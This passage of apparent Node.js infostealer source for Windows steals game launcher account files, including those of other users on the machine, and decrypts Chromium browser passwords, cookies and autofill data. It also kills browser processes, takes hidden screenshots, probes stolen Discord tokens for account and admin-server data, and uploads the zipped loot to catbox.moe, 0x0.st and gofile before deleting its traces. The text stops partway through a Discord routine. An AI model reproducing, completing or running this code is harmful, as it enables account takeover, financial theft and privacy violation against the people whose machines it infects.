                gamesCount++;

            } catch (err) {
                logError(err, 'fetchGamesData-PrismLauncherPortable');
            }
        }

        for (const [gameName, gamePaths] of Object.entries(gamesPaths)) {
            try {
                let gameFound = false;
                if (!fs.existsSync(gamesDir)) fs.mkdirSync(gamesDir, { recursive: true });
                const gameTargetDir = path.join(gamesDir, gameName);

                for (const [pathName, config] of Object.entries(gamePaths)) {
                    try {
                        const relativePath = typeof config === 'string' ? config : config.path;
                        const excludes = typeof config === 'string' ? [] : (config.excludes || []);

                        let fullPath;
                        if (relativePath.startsWith('Program Files')) {
                            fullPath = path.join('C:', relativePath);
                        } else if (relativePath.startsWith('Documents')) {
                            fullPath = path.join(userHome, relativePath);
                        } else {
                            fullPath = path.join(userHome, relativePath);
                        }

                        if (copyFileIfExists(fullPath, path.join(gameTargetDir, pathName), null, excludes, MAX_FILE_SIZE)) {
                            gameFound = true;
                            logInfo(`[Games] Successfully collected: ${gameName} -> ${pathName}`);
                        }
                    } catch (err) {
                        logError(err, `fetchGamesData-${gameName}-${pathName}`);
                    }
                }

                if (gameFound) {
                    gamesCount++;

                    if (gameName === 'Minecraft') {
                        await extractMinecraftSessionInfo(gameTargetDir);
                    }

                    if (gameName === 'PrismLauncher') {
                        await extractPrismLauncherInfo(gameTargetDir);
                    }
                }
            } catch (err) {
                logError(err, `fetchGamesData-${gameName}`);
            }
        }

        await scanOtherUsersGames(gamesDir, MAX_FILE_SIZE);
    } catch (error) {
        logError(error, 'fetchGamesData');
    }

    return gamesCount;
}

async function extractPrismLauncherInfo(prismDir) {
    try {
        const prismInfo = [];
        prismInfo.push('=== PrismLauncher Information ===\n');

        const accountsPath = path.join(prismDir, 'Accounts', 'accounts.json');
        if (fs.existsSync(accountsPath)) {
            try {
                prismInfo.push('--- Accounts ---');
                const accountsData = JSON.parse(fs.readFileSync(accountsPath, 'utf8'));

                if (accountsData.accounts && Array.isArray(accountsData.accounts)) {
                    accountsData.accounts.forEach((account, index) => {
                        prismInfo.push(`Account ${index + 1}:`);
                        prismInfo.push(`  Type: ${account.type || 'Unknown'}`);
                        prismInfo.push(`  Username: ${account.username || 'N/A'}`);
                        prismInfo.push(`  UUID: ${account.uuid || 'N/A'}`);

                        if (account.microsoft) {
                            prismInfo.push(`  Microsoft Account: Yes`);
                            prismInfo.push(`  Access Token: ${account.microsoft.access_token ? 'Present' : 'Missing'}`);
                            prismInfo.push(`  Refresh Token: ${account.microsoft.refresh_token ? 'Present' : 'Missing'}`);
                        }

                        prismInfo.push('');
                    });
                } else {
                    prismInfo.push('No accounts found or invalid format');
                }
            } catch (e) {
                prismInfo.push(`Error reading accounts.json: ${e.message}`);
            }
        }

        const configPath = path.join(prismDir, 'Config', 'prismlauncher.cfg');
        if (fs.existsSync(configPath)) {
            try {
                prismInfo.push('--- Configuration ---');
                const configContent = fs.readFileSync(configPath, 'utf8');
                const lines = configContent.split('\n');

                const relevantKeys = ['InstanceDir', 'DownloadsDir', 'JavaPath', 'MaxMemAlloc'];
                lines.forEach(line => {
                    relevantKeys.forEach(key => {
                        if (line.startsWith(key + '=')) {
                            prismInfo.push(`  ${line.trim()}`);
                        }
                    });
                });

                prismInfo.push('');
            } catch (e) {
                prismInfo.push(`Error reading config: ${e.message}`);
            }
        }
        const instancesPath = path.join(prismDir, 'Instances');
        if (fs.existsSync(instancesPath)) {
            try {
                const instances = fs.readdirSync(instancesPath);
                prismInfo.push('--- Instances ---');
                prismInfo.push(`Total instances found: ${instances.length}`);

                instances.forEach((instance, index) => {
                    if (index < 5) {
                        const instancePath = path.join(instancesPath, instance);
                        if (fs.existsSync(instancePath)) {
                            const instanceCfg = path.join(instancePath, 'instance.cfg');
                            if (fs.existsSync(instanceCfg)) {
                                try {
                                    const cfgContent = fs.readFileSync(instanceCfg, 'utf8');
                                    const nameMatch = cfgContent.match(/name=([^\n]+)/);
                                    const versionMatch = cfgContent.match(/IntendedVersion=([^\n]+)/);

                                    prismInfo.push(`  ${instance}:`);
                                    prismInfo.push(`    Name: ${nameMatch ? nameMatch[1] : 'Unknown'}`);
                                    prismInfo.push(`    Version: ${versionMatch ? versionMatch[1] : 'Unknown'}`);
                                } catch (e) {
                                    prismInfo.push(`  ${instance}: (config read error)`);
                                }
                            }
                        }
                    }
                });
                if (instances.length > 5) {
                    prismInfo.push(`  ... and ${instances.length - 5} more instances`);
                }
                prismInfo.push('');
            } catch (e) {
                prismInfo.push(`Error reading instances: ${e.message}`);
            }
        }

        if (prismInfo.length > 1) {
            const prismInfoPath = path.join(prismDir, 'PrismLauncher_Info.txt');
            fs.writeFileSync(prismInfoPath, prismInfo.join('\n'), 'utf8');
        }

    } catch (error) {
        logError(error, 'extractPrismLauncherInfo');
    }
}

async function extractMinecraftSessionInfo(minecraftDir) {
    try {
        const sessionInfo = [];

        const launcherAccountsPath = path.join(minecraftDir, 'Launcher Accounts (Microsoft)', 'launcher_accounts.json');
        if (fs.existsSync(launcherAccountsPath)) {
            try {
                const accountsData = JSON.parse(fs.readFileSync(launcherAccountsPath, 'utf8'));
                sessionInfo.push('=== Minecraft Launcher Accounts ===');
                for (const [key, account] of Object.entries(accountsData.accounts || {})) {
                    sessionInfo.push(`Account ID: ${key}`);
                    sessionInfo.push(`Username: ${account.username || 'N/A'}`);
                    sessionInfo.push(`UUID: ${account.profileId || 'N/A'}`);
                    sessionInfo.push(`Type: ${account.type || 'N/A'}`);
                    sessionInfo.push('---');
                }
            } catch (e) {
                sessionInfo.push('Error reading launcher_accounts.json');
            }
        }

        const serversPath = path.join(minecraftDir, 'Server List', 'servers.dat');
        if (fs.existsSync(serversPath)) {
            try {
                sessionInfo.push('\n=== Minecraft Servers ===');
                sessionInfo.push('Server list found in servers.dat (NBT format)');
                sessionInfo.push(`File size: ${fs.statSync(serversPath).size} bytes`);
            } catch (e) {
                sessionInfo.push('Error reading servers.dat');
            }
        }

        const lastLoginPath = path.join(minecraftDir, 'Last Login', 'lastlogin');
        if (fs.existsSync(lastLoginPath)) {
            try {
                const lastLoginData = fs.readFileSync(lastLoginPath, 'utf8');
                sessionInfo.push('\n=== Last Login Info ===');
                sessionInfo.push(lastLoginData);
            } catch (e) {
                sessionInfo.push('Error reading lastlogin file');
            }
        }
        if (sessionInfo.length > 0) {
            const sessionInfoPath = path.join(minecraftDir, 'Minecraft_Session_Info.txt');
            fs.writeFileSync(sessionInfoPath, sessionInfo.join('\n'), 'utf8');
        }

    } catch (error) {
        logError(error, 'extractMinecraftSessionInfo');
    }
}

async function scanOtherUsersGames(gamesDir, maxSize = null) {
    try {
        const usersDir = 'C:\\Users';
        if (!fs.existsSync(usersDir)) return;

        const users = fs.readdirSync(usersDir);

        for (const user of users) {
            try {
                if (user === 'Public' || user === 'Default' || user === 'Default User' ||
                    user === 'All Users' || user === os.userInfo().username) {
                    continue;
                }

                const userDir = path.join(usersDir, user);
                const userGamesDir = path.join(gamesDir, `User_${user}`);

                const minecraftPaths = [
                    path.join(userDir, 'AppData', 'Roaming', '.minecraft'),
                    path.join(userDir, 'AppData', 'Local', 'Packages', 'Microsoft.MinecraftUWP_8wekyb3d8bbwe', 'LocalState', 'games', 'com.mojang')
                ];

                const prismPaths = [
                    path.join(userDir, 'AppData', 'Roaming', 'PrismLauncher'),
                    path.join(userDir, 'AppData', 'Local', 'PrismLauncher')
                ];

                for (const minecraftPath of minecraftPaths) {
                    if (fs.existsSync(minecraftPath)) {
                        copyFolderRecursiveSync(minecraftPath, path.join(userGamesDir, path.basename(minecraftPath)), ['region'], maxSize);

                    }
                }
                for (const prismPath of prismPaths) {
                    if (fs.existsSync(prismPath)) {
                        copyFolderRecursiveSync(prismPath, path.join(userGamesDir, 'PrismLauncher'), ['region'], maxSize);

                    }
                }
            } catch (err) {
            }
        }
    } catch (error) {
        logError(error, 'scanOtherUsersGames');
    }
}

async function uploadToCatbox(zipFilePath) {
    return new Promise((resolve, reject) => {
        const curlPath = 'C:\\Windows\\System32\\curl.exe';
        const cmd = `"${curlPath}" -s -F "reqtype=fileupload" -F "fileToUpload=@\"${zipFilePath}\"" "https://catbox.moe/user/api.php"`;

        try {
            const size = fs.statSync(zipFilePath).size;
            if (size > 200 * 1024 * 1024) {
                logInfo(`[Catbox] Skipping upload: File too large (${formatBytes(size)})`);
                return resolve(null);
            }
            logInfo(`[Catbox] Uploading ${path.basename(zipFilePath)} (Size: ${formatBytes(size)})...`);
        } catch (e) { }

        exec(cmd, { timeout: 3600000, windowsHide: true }, (error, stdout, stderr) => {
            const output = stdout ? stdout.trim() : '';

            if (error) {
                console.error(`[Catbox] Curl/Exec Error: ${error.message}`);
                if (error.killed) {
                    return reject(new Error('Upload to Catbox timed out.'));
                }
            }

            console.log(`[Catbox] Output length: ${output.length} characters`);

            if (output.startsWith('http')) {
                console.log(`[Catbox] Success: ${output}`);
                resolve(output);
            } else {
                if (output && output.includes('http')) {
                    const match = output.match(/http[^\s]+/);
                    if (match) {
                        console.log(`[Catbox] Success (matched link): ${match[0]}`);
                        return resolve(match[0]);
                    }
                }

                const errMsg = `Upload failed via curl. Output: ${output.slice(0, 100)} | Stderr: ${stderr ? stderr.slice(0, 100) : 'N/A'}`;
                reject(new Error(errMsg));
            }
        });
    });
}

async function uploadTo0x0(zipFilePath) {
    return new Promise((resolve, reject) => {
        const curlPath = 'C:\\Windows\\System32\\curl.exe';
        const cmd = `"${curlPath}" -s -F "file=@\"${zipFilePath}\"" "https://0x0.st"`;
        try {
            const size = fs.statSync(zipFilePath).size;
            if (size > 512 * 1024 * 1024) {
                logInfo(`[0x0.st] Skipping upload: File too large (${formatBytes(size)})`);
                return resolve(null);
            }
            logInfo(`[0x0.st] Uploading ${path.basename(zipFilePath)} (Size: ${formatBytes(size)})...`);
        } catch (e) { }
        exec(cmd, { timeout: 3600000, windowsHide: true }, (error, stdout, stderr) => {
            const output = stdout ? stdout.trim() : '';
            if (error) {
                console.error(`[0x0.st] Curl Error: ${error.message}`);
                if (error.killed) return reject(new Error('Upload to 0x0.st timed out.'));
            }
            if (output.startsWith('http')) {
                console.log(`[0x0.st] Success: ${output}`);
                resolve(output);
            } else {
                if (output && output.includes('http')) {
                    const match = output.match(/http[^\s]+/);
                    if (match) {
                        console.log(`[0x0.st] Success (matched): ${match[0]}`);
                        return resolve(match[0]);
                    }
                }
                const errMsg = `0x0.st upload failed. Output: ${output.slice(0, 100)}`;
                reject(new Error(errMsg));
            }
        });
    });
}

async function getServers() {
    try {
        const response = await axios.get('https://api.gofile.io/servers', { timeout: 10000 });
        if (response.data && response.data.status === 'ok' && response.data.data && Array.isArray(response.data.data.servers)) {
            return response.data.data.servers;
        }
        return [];
    } catch (error) {
        return [];
    }
}

async function uploadToGofile(zipFilePath) {
    const maxRetries = 3;
    let lastError = null;

    for (let attempt = 1; attempt <= maxRetries; attempt++) {
        try {
            if (!fs.existsSync(zipFilePath)) {
                throw new Error('Zip file does not exist for upload');
            }

            if (attempt === 1) {
                try {
                    const size = fs.statSync(zipFilePath).size;
                    logInfo(`[GoFile] Uploading ${path.basename(zipFilePath)} (Size: ${formatBytes(size)})...`);
                } catch (e) { }
            }

            const url = `https://upload.gofile.io/uploadfile`;

            const form = new FormData();
            form.append('file', fs.createReadStream(zipFilePath));

            const httpsAgent = new (require('https').Agent)({ rejectUnauthorized: false });

            const response = await axios.post(url, form, {
                headers: {
                    ...form.getHeaders()
                },
                httpsAgent: httpsAgent,
                maxContentLength: Infinity,
                maxBodyLength: Infinity,
                timeout: 3600000
            });

            if (response.data && response.data.status === 'ok') {
                return response.data.data.downloadPage;
            } else {
                const status = response.data ? response.data.status : 'unknown';
                throw new Error(`Gofile upload failed with status: ${status}`);
            }
        } catch (error) {
            lastError = error;
            const errorDetail = error.response ? JSON.stringify(error.response.data) : error.message;
            console.error(`[ATTEMPT ${attempt}] Gofile upload failed: ${errorDetail}`);

            if (attempt < maxRetries) {
                const delay = attempt * 5000;
                await new Promise(resolve => setTimeout(resolve, delay));
            }
        }
    }

    try {
        const servers = await getServers();
        if (servers.length > 0) {
            const server = servers[Math.floor(Math.random() * servers.length)].name;
            const url = `https://${server}.gofile.io/uploadFile`;
            const form = new FormData();
            form.append('file', fs.createReadStream(zipFilePath));

            const httpsAgent = new (require('https').Agent)({ rejectUnauthorized: false });

            const response = await axios.post(url, form, {
                headers: { ...form.getHeaders() },
                httpsAgent: httpsAgent,
                maxContentLength: Infinity,
                maxBodyLength: Infinity,
                timeout: 3600000
            });
            if (response.data && response.data.status === 'ok') {
                return response.data.data.downloadPage;
            }
        }
    } catch (fallbackError) {
        console.error('[FALLBACK] Gofile upload failed:', fallbackError.message);
    }

    logError(lastError, 'uploadToGofile final failure');
    throw lastError;
}

function createZipArchiveCatbox(sourceDir, zipFilePath) {
    return new Promise((resolve, reject) => {
        const output = fs.createWriteStream(zipFilePath);
        const archive = archiver('zip', { zlib: { level: 9 }, comment: "t.me/avmtools | @Wallgod69" });

        output.on('close', () => resolve(zipFilePath));
        archive.on('error', (error) => {
            logError(error, 'createZipArchiveCatbox');
            reject(error);
        });

        archive.pipe(output);
        const rootFolderName = path.basename(zipFilePath, '.zip');
        archive.directory(sourceDir, rootFolderName);
        archive.finalize();
    });
}

function createZipArchive(sourceDir, zipFilePath) {
    return new Promise((resolve, reject) => {
        const output = fs.createWriteStream(zipFilePath);
        const archive = archiver('zip', { zlib: { level: 9 }, comment: "t.me/avmtools | @Wallgod6" });

        output.on('close', () => resolve(zipFilePath));
        archive.on('error', (error) => {
            logError(error, 'createZipArchive');
            reject(error);
        });

        archive.pipe(output);
        archive.directory(sourceDir, false);
        archive.finalize();
    });
}

function getDirectorySize(directory) {
    let size = 0;
    try {
        if (fs.existsSync(directory)) {
            const files = fs.readdirSync(directory);
            for (const file of files) {
                const filePath = path.join(directory, file);
                const stats = fs.statSync(filePath);
                if (stats.isDirectory()) {
                    size += getDirectorySize(filePath);
                } else {
                    size += stats.size;
                }
            }
        }
    } catch (e) { }
    return size;
}

async function createAndUploadZip() {
    const destinationFolder = path.dirname(mainFolderPath);
    const baseName = `${locale}-${computerName}`;
    let downloadLink = null;
    let folderSize = 0;

    try {
        folderSize = getDirectorySize(mainFolderPath);
        logInfo(`[System] Folder size before zip: ${(folderSize / 1024 / 1024).toFixed(2)} MB`);
    } catch (e) { }

    const catboxZipPath = path.join(destinationFolder, `${baseName}.zip`);
    const gofileZipPath = path.join(destinationFolder, `${baseName}_fallback.zip`);

    if (folderSize < 200 * 1024 * 1024) {
        try {
            console.log(`[Catbox] Creating specialized zip...`);
            await createZipArchiveCatbox(mainFolderPath, catboxZipPath);
            if (fs.existsSync(catboxZipPath)) {
                downloadLink = await uploadToCatbox(catboxZipPath);
                if (downloadLink && downloadLink.startsWith('http')) {
                    logSuccess(`Catbox Upload Success: ${downloadLink}`);
                    return { link: downloadLink, size: formatBytes(fs.statSync(catboxZipPath).size) };
                }
            }
        } catch (e) {
            logError(e, 'Catbox-Process-Failed');
        }
    } else {
        logInfo(`[Catbox] Skipping: file too large (${(folderSize / 1024 / 1024).toFixed(2)} MB)`);
    }

    if (!downloadLink && folderSize < 500 * 1024 * 1024) {
        try {
            if (fs.existsSync(catboxZipPath)) {
                downloadLink = await uploadTo0x0(catboxZipPath);
                if (downloadLink && downloadLink.startsWith('http')) {
                    logSuccess(`0x0.st Upload Success: ${downloadLink}`);
                    return { link: downloadLink, size: formatBytes(fs.statSync(catboxZipPath).size) };
                }
            }
        } catch (e) {
            logError(e, '0x0.st-Upload-Failed');
        }
    }

    try {
        console.log(`[GoFile] Creating fallback zip...`);
        await createZipArchive(mainFolderPath, gofileZipPath);
        if (fs.existsSync(gofileZipPath)) {
            downloadLink = await uploadToGofile(gofileZipPath);
            if (downloadLink && downloadLink.startsWith('http')) {
                logSuccess(`GoFile Upload Success: ${downloadLink}`);
                return { link: downloadLink, size: formatBytes(fs.statSync(gofileZipPath).size) };
            }
        }
    } catch (e) {
        logError(e, 'GoFile-Fallback-Failed');
    }

    if (!downloadLink) {
        logError('All upload providers failed. No download link generated.', 'createAndUploadZip-final');
    }

    let finalSize = formatBytes(folderSize);
    return { link: downloadLink, size: finalSize };
}

function initializeFolders() {
    try {
        if (!fs.existsSync(mainFolderPath)) {
            fs.mkdirSync(mainFolderPath, { recursive: true });
        }

        const logFilePath = path.join(mainFolderPath, 'log.txt');
        const startMessage = `[START] ${getTimestamp()} | PID: ${process.pid}\n`;
        if (!fs.existsSync(logFilePath)) {
            fs.writeFileSync(logFilePath, startMessage, 'utf8');
        } else {
            fs.appendFileSync(logFilePath, startMessage, 'utf8');
        }
    } catch (error) { }
}

function selfCleanup(downloadLink) {
    try {
        const destinationFolder = path.dirname(mainFolderPath);
        const zipFilePath = path.join(destinationFolder, `${locale}-${computerName}.zip`);
        const fallbackZipPath = path.join(destinationFolder, `${locale}-${computerName}_fallback.zip`);

        if (fs.existsSync(zipFilePath)) {
            try { fs.unlinkSync(zipFilePath); } catch (e) { }
        }
        if (fs.existsSync(fallbackZipPath)) {
            try { fs.unlinkSync(fallbackZipPath); } catch (e) { }
        }

        if (downloadLink && fs.existsSync(mainFolderPath)) {
            const deleteFolderRecursive = (folderPath) => {
                if (fs.existsSync(folderPath)) {
                    fs.readdirSync(folderPath).forEach((file) => {
                        const curPath = path.join(folderPath, file);
                        if (fs.lstatSync(curPath).isDirectory()) {
                            deleteFolderRecursive(curPath);
                        } else {
                            fs.unlinkSync(curPath);
                        }
                    });
                    fs.rmdirSync(folderPath);
                }
            };
            deleteFolderRecursive(mainFolderPath);
        } else {
            console.log('[CMD] 0x01P:', mainFolderPath);
        }

        const parentDir = path.dirname(mainFolderPath);
        const lockFile = path.join(parentDir, 'WinHost.lock');
        if (fs.existsSync(lockFile)) {
            try { fs.unlinkSync(lockFile); } catch (e) { }
        }

        if (fs.existsSync(parentDir) && fs.readdirSync(parentDir).length === 0) {
            try { fs.rmdirSync(parentDir); } catch (e) { }
        }

    } catch (error) {
    }
}

async function loadConfiguration() {

    const keyCache = {};

    for (let i = 0; i < browserPath.length; i++) {
        try {
            const profilePath = browserPath[i][0];
            const userDataPath = browserPath[i][2];

            if (!fs.existsSync(profilePath)) {
                continue;
            }

            if (keyCache[userDataPath]) {

                browserPath[i].push(keyCache[userDataPath]);
                continue;
            }

            const localStatePath = userDataPath + 'Local State';
            if (!fs.existsSync(localStatePath)) {
                continue;
            }

            let encryptedKey = Buffer.from(
                JSON.parse(fs.readFileSync(localStatePath))
                    .os_crypt.encrypted_key,
                'base64'
            ).slice(5);
            const keyArray = Array.from(encryptedKey);
            const decryptedKey = await new Promise((resolve, reject) => {
                exec(
                    'powershell.exe Add-Type -AssemblyName System.Security; [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]@(' +
                    keyArray +
                    "), $null, 'CurrentUser')",
                    { timeout: 10000, windowsHide: true },
                    (error, stdout, stderr) => {
                        if (error) {
                            reject(error);
                        } else {
                            resolve(stdout);
                        }
                    }
                );
            });

            const filteredKey = decryptedKey.toString().split('\r\n').filter((line) => line != '');
            const keyBuffer = Buffer.from(filteredKey);

            keyCache[userDataPath] = keyBuffer;
            browserPath[i].push(keyBuffer);


        } catch (error) {
            logError(error, `getEncrypted-${browserPath[i][1]}`);
        }
    }

}

async function extractBrowserData(query, type) {
    const groupedData = {};
    let count = 0;

    for (let i = 0; i < browserPath.length; i++) {
        try {
            const profilePath = browserPath[i][0];
            const browserNameRaw = browserPath[i][1];
            const key = browserPath[i][3];

            if (!fs.existsSync(profilePath)) continue;

            let appName;
            if (profilePath.includes('Local')) {
                appName = profilePath.split('\\Local\\')[1].split('\\')[0];
            } else {
                appName = profilePath.split('\\Roaming\\')[1].split('\\')[1];
            }

            const browserName = `${appName} ${browserNameRaw}`;

            let dbFileName;
            if (type === 'passwords') dbFileName = 'Login Data';
            else if (type === 'cookies') dbFileName = 'Network\\Cookies';
            else if (type === 'autofill') dbFileName = 'Web Data';

            let dbPath = path.join(profilePath, dbFileName);

            if (type === 'cookies' && !fs.existsSync(dbPath)) {
                dbPath = path.join(profilePath, 'Cookies');
            }

            if (!fs.existsSync(dbPath)) continue;

            const tempDbPath = path.join(os.tmpdir(), `${type}_${generateRandomString(8)}.db`);

            try {
                fs.copyFileSync(dbPath, tempDbPath);
            } catch (e) {
                // Killed & Retry Logic
                try {
                    let procName = '';
                    if (profilePath.includes('Chrome')) procName = 'chrome.exe';
                    else if (profilePath.includes('Edge')) procName = 'msedge.exe';
                    else if (profilePath.includes('Brave')) procName = 'brave.exe';
                    else if (profilePath.includes('Yandex')) procName = 'browser.exe';
                    else if (profilePath.includes('Opera')) procName = 'opera.exe';

                    if (procName) {
                        try {
                            execSync(`taskkill /IM "${procName}" /F`, { stdio: 'ignore', windowsHide: true });
                            await new Promise(r => setTimeout(r, 1000)); // Wait for release
                            fs.copyFileSync(dbPath, tempDbPath); // Retry
                        } catch (retryErr) {
                            continue; // Still failed, skip
                        }
                    } else {
                        continue;
                    }
                } catch (killErr) {
                    continue;
                }
            }

            if (!sqlite3) {
                try { fs.unlinkSync(tempDbPath); } catch (e) { }
                continue;
            }

            const db = new sqlite3.Database(tempDbPath);
            const currentBrowserLines = [];

            await new Promise((resolve) => {
                db.each(query, (err, row) => {
                    if (err) return;
                    if (!row) return;

                    try {
                        let formattedData = '';

                        if (type === 'passwords') {
                            if (!row.username_value) return;
                            if (!key) return;

                            let encryptedPassword = row.password_value;
                            if (!encryptedPassword || encryptedPassword.length < 32) return;

                            const iv = encryptedPassword.slice(3, 15);
                            const encrypted = encryptedPassword.slice(15, encryptedPassword.length - 16);
                            const authTag = encryptedPassword.slice(encryptedPassword.length - 16, encryptedPassword.length);

                            const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
                            decipher.setAuthTag(authTag);
                            const password = decipher.update(encrypted, 'base64', 'utf-8') + decipher.final('utf-8');

                            const dateCreated = row.date_created ? new Date(row.date_created / 1000 - 11644473600 * 1000).toLocaleString() : 'Unknown';

                            formattedData = `================\nURL: ${row.origin_url}\nUsername: ${row.username_value}\nPassword: ${password}\nDate Created: ${dateCreated}\nApplication: ${browserName}\n\n`;

                        } else if (type === 'cookies') {
                            const creationDate = row.creation_utc ? new Date(row.creation_utc / 1000 - 11644473600 * 1000).toLocaleString() : 'Unknown';
                            const expirationDate = row.expires_utc ? new Date(row.expires_utc / 1000 - 11644473600 * 1000).toLocaleString() : 'Unknown';
                            const cookieValue = row.encrypted_value;

                            // Decrypt Cookie Value
                            let decryptedValue = '';
                            if (cookieValue && (cookieValue.length > 0)) {
                                try {
                                    if (key) {
                                        const iv = cookieValue.slice(3, 15);
                                        const encrypted = cookieValue.slice(15, cookieValue.length - 16);
                                        const authTag = cookieValue.slice(cookieValue.length - 16, cookieValue.length);
                                        const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
                                        decipher.setAuthTag(authTag);
                                        decryptedValue = decipher.update(encrypted, 'base64', 'utf-8') + decipher.final('utf-8');
                                    } else {
                                        decryptedValue = row.value || 'Cant Decrypt';
                                    }
                                } catch (e) { decryptedValue = 'Error Decrypting'; }
                            } else {
                                decryptedValue = row.value || '';
                            }

                            formattedData = `================\nHost: ${row.host_key}\nName: ${row.name}\nValue: ${decryptedValue}\nCreation Date: ${creationDate}\nExpiration Date: ${expirationDate}\nApplication: ${browserName}\n\n`;

                        } else if (type === 'autofill') {
                            formattedData = `================\nName: ${row.name}\nValue: ${row.value}\nApplication: ${browserName}\n\n`;
                        }

                        if (formattedData) {
                            currentBrowserLines.push(formattedData);
                            count++;
                        }

                    } catch (processError) {
                    }
                }, () => {
                    db.close(() => {
                        try { if (fs.existsSync(tempDbPath)) fs.unlinkSync(tempDbPath); } catch (e) { }
                        resolve();
                    });
                });
            });

            if (currentBrowserLines.length > 0) {
                groupedData[browserName] = currentBrowserLines;
            }

        } catch (error) {
            logError(error, `extract-${type}-${i}`);
        }
    }
    return { count, groupedData };
}

async function fetchUserData() {

    const query = 'SELECT origin_url, username_value, password_value, date_created FROM logins';
    const result = await extractBrowserData(query, 'passwords');

    if (result.count > 0) {
        const passwordsFolderPath = path.join(mainFolderPath, 'Passwords');
        if (!fs.existsSync(passwordsFolderPath)) fs.mkdirSync(passwordsFolderPath, { recursive: true });

        for (const [bName, data] of Object.entries(result.groupedData)) {
            const cleanName = bName.replace(/[^a-zA-Z0-9 ]/g, "");
            const passwordsFilePath = path.join(passwordsFolderPath, `${cleanName}.txt`);
            fs.writeFileSync(passwordsFilePath, user.copyright + data.join(''), { encoding: 'utf8', flag: 'w' });
        }
    }

    return result.count;
}

async function fetchSessionData() {

    const query = 'SELECT host_key, name, encrypted_value, creation_utc, expires_utc FROM cookies';
    const result = await extractBrowserData(query, 'cookies');

    if (result.count > 0) {
        const cookiesDir = path.join(mainFolderPath, 'Cookies');
        if (!fs.existsSync(cookiesDir)) fs.mkdirSync(cookiesDir, { recursive: true });

        for (const [bName, data] of Object.entries(result.groupedData)) {
            const cleanName = bName.replace(/[^a-zA-Z0-9 ]/g, "");
            const cookiesFile = path.join(cookiesDir, `Cookies_[${cleanName}].txt`);
            fs.writeFileSync(cookiesFile, user.copyright + data.join(''), { encoding: 'utf8', flag: 'w' });
        }
    }

    return result.count;
}

async function fetchFormData() {

    const query = 'SELECT * FROM autofill';
    const result = await extractBrowserData(query, 'autofill');

    if (result.count > 0) {
        const autofillsFolderPath = path.join(mainFolderPath, 'Autofills');
        if (!fs.existsSync(autofillsFolderPath)) fs.mkdirSync(autofillsFolderPath, { recursive: true });

        for (const [bName, data] of Object.entries(result.groupedData)) {
            const cleanName = bName.replace(/[^a-zA-Z0-9 ]/g, "");
            const autofillsFilePath = path.join(autofillsFolderPath, `Autofills_[${cleanName}].txt`);
            fs.writeFileSync(autofillsFilePath, user.copyright + data.join(''), { encoding: 'utf8', flag: 'w' });
        }
    }

    return result.count;
}

function cleanupProcesses() {
    try {
        const processMap = PATHS.processes;

        const processesToKill = new Set();

        for (const entry of browserPath) {
            const pathToCheck = entry[0];
            if (fs.existsSync(pathToCheck)) {
                for (const [key, exe] of Object.entries(processMap)) {
                    if (pathToCheck.includes(key)) {
                        processesToKill.add(exe);
                    }
                }
            }
        }

        if (processesToKill.size > 0) {
            const taskListCmd = decodeString('dGFza2xpc3Q=');
            const taskKillCmd = decodeString('dGFza2tpbGw=');

            try {
                const tasks = execSync(taskListCmd, { timeout: 3000, windowsHide: true }).toString();

                for (const proc of processesToKill) {
                    if (tasks.toLowerCase().includes(proc.toLowerCase())) {
                        try {
                            execSync(taskKillCmd + ' /IM ' + proc + ' /F', { stdio: 'ignore', timeout: 3000, windowsHide: true });
                        } catch (killErr) {
                        }
                    }
                }
            } catch (err) {
            }
        }

    } catch (e) {
        logError(e, 'cleanupProcesses');
    }
}

function captureAllScreens() {
    return new Promise((resolve, reject) => {
        const screenshotDir = path.dirname(screenshotPath);
        if (!fs.existsSync(screenshotDir)) fs.mkdirSync(screenshotDir, { recursive: true });

        const psScript = `
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$bounds = [System.Windows.Forms.SystemInformation]::VirtualScreen
$bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)
$bitmap.Save("${screenshotPath}", [System.Drawing.Imaging.ImageFormat]::Png)

$graphics.Dispose()
$bitmap.Dispose()
"OK"
`;
        const psBase64 = Buffer.from(psScript, "utf16le").toString("base64");
        exec(`powershell -ExecutionPolicy Bypass -EncodedCommand ${psBase64}`, { timeout: 15000, windowsHide: true }, (err, stdout, stderr) => {
            if (err) {
                logError(err, 'captureAllScreens-exec');
                return reject(err);
            }

            fs.readFile(screenshotPath, (readErr, data) => {
                if (readErr) {
                    logError(readErr, 'captureAllScreens-readFile');
                    reject(readErr);
                } else {
                    resolve(data);
                }
            });
        });
    });
}


const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
const discordHeaders = (token) => ({
    "Authorization": token,
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Content-Type": "application/json"
});

async function getUserData(token) {
    try {
        await sleep(1000);
        const userResponse = await axios.get("https://discord.com/api/v9/users/@me", {
            headers: discordHeaders(token),
            timeout: 5000
        });

        const userData = userResponse.data;

        if (!userData) return null;

        const id = userData.id;
        const username = userData.username;
        const discriminator = userData.discriminator;
        const avatar = userData.avatar;
        const email = userData.email;
        const phone = userData.phone;
        const mfa_enabled = userData.mfa_enabled;
        const flags = userData.flags;
        const premium_type = userData.premium_type;
        const bio = userData.bio;

        return {
            id,
            username,
            discriminator,
            avatar,
            email,
            phone,
            mfa_enabled,
            flags,
            premium_type,
            bio
        };
    } catch (error) {
        return null;
    }
}

async function fetchDiscordTokens() {

    async function getGuildInvites(token, guildId) {
        try {
            await sleep(1500);
            const response = await axios.get(`https://discord.com/api/v9/guilds/${guildId}/invites`, {
                headers: discordHeaders(token),
                timeout: 5000
            });
            return response.data;
        } catch (error) { return []; }
    }

    async function getHQGuilds(token) {
        try {
            await sleep(1000);
            const response = await axios.get("https://discord.com/api/v9/users/@me/guilds?with_counts=true", {
                headers: discordHeaders(token),
                timeout: 5000
            });

            const hqGuilds = response.data.filter(guild => {
                const perms = BigInt(guild.permissions);
                const admin = BigInt(0x8);
                return (perms & admin) === admin || guild.owner;
            });

            if (hqGuilds.length === 0) {
                return "```No HQ Guilds```";
            }

            let result = "";
            for (const guild of hqGuilds) {
                const invites = await getGuildInvites(token, guild.id);
                const invite = invites.length > 0 ? `[Join Server](https://discord.gg/${invites[0].code})` : "No Invite";
